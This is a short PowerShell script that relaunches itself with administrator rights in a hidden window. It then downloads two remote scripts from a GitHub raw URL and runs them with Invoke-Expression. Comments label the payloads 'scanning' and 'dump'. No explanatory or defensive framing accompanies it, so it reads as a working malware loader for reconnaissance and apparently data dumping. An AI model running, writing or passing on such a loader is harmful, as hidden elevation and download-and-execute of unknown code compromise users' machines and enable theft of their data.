if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }

#scanning
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan_124509')"
#dump
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/body_124509')"
